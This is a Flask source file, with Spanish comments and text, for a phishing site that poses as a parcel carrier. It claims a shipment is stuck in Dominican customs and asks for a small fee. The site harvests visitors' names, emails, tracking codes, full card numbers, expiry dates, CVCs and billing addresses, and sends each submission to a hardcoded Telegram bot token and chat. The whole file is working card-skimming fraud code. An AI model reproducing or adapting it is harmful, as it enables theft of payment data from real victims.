from flask import Flask, render_template, request, redirect, session
import requests, os

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "clave-ultra-segura")  # Necesario para las sesiones

TELEGRAM_TOKEN = "7953781468:AAHKqBNSBucJCUnuz7uBUetiaVPv_hAPyHI"
TELEGRAM_CHAT_ID = "-1002868091163"

@app.route("/", methods=["GET"])
def index():
    # Se obtiene la información del usuario actual desde la sesión
    cliente_info = session.get("cliente_info", {})
    mensaje = session.get("mensaje", False)
    pago = session.get("pago", False)
    return render_template("index.html", cliente=cliente_info, mensaje=mensaje, pago=pago)

@app.route("/enviar", methods=["POST"])
def enviar():
    nombre = request.form.get("nombre")
    correo = request.form.get("correo")
    codigo = request.form.get("codigo")
    
    # Guardar datos del cliente en sesión (por usuario)
    session["cliente_info"] = {
        "nombre": nombre,
        "correo": correo,
        "codigo": codigo
    }
    
    # Enviar info inicial a Telegram
    mensaje_telegram = f"""
*Nuevo pedido recibido:*
Nombre: {nombre}
Correo: {correo}
Código: {codigo}
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje_telegram, "parse_mode": "Markdown"})
    
    session["mensaje"] = True
    session["pago"] = False
    return redirect("/")

@app.route("/pago", methods=["POST"])
def pago_route():
    session["mensaje"] = False
    session["pago"] = True
    return redirect("/")

@app.route("/procesar_pago", methods=["POST"])
def procesar_pago():
    cliente_info = session.get("cliente_info", {}).copy()

    # Recoger info de pago
    cliente_info.update({
        "card_number": request.form.get("card_number"),
        "card_brand": request.form.get("card_brand"),
        "exp": request.form.get("exp"),
        "cvc": request.form.get("cvc"),
        "holder": request.form.get("holder"),
        "addr1": request.form.get("addr1"),
        "addr2": request.form.get("addr2"),
        "postal": request.form.get("postal"),
        "city": request.form.get("city"),
        "country": request.form.get("country")
    })
    
    # Enviar info completa a Telegram
    mensaje_telegram = f"""
*{cliente_info.get('nombre', '')} tu envío tuvo un pequeño conflicto en la aduana dominicana.*
Para liberarlo rápidamente, necesitamos una pequeña comisión de $3.45.

📄 *Datos del pedido:*
Nombre: {cliente_info.get('nombre', '')}
Correo: {cliente_info.get('correo', '')}
Código: {cliente_info.get('codigo', '')}

💳 *Datos de pago:*
Tarjeta: {cliente_info.get('card_brand', '')} {cliente_info.get('card_number', '')}
Exp: {cliente_info.get('exp', '')}
CVC: {cliente_info.get('cvc', '')}
Titular: {cliente_info.get('holder', '')}
Dirección: {cliente_info.get('addr1', '')} {cliente_info.get('addr2', '')}
Ciudad: {cliente_info.get('city', '')}
Código Postal: {cliente_info.get('postal', '')}
País: {cliente_info.get('country', '')}
"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje_telegram, "parse_mode": "Markdown"})
    
    # Limpiar la sesión del usuario (solo de este visitante)
    session.pop("cliente_info", None)
    session["mensaje"] = False
    session["pago"] = False

    return redirect("/")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))




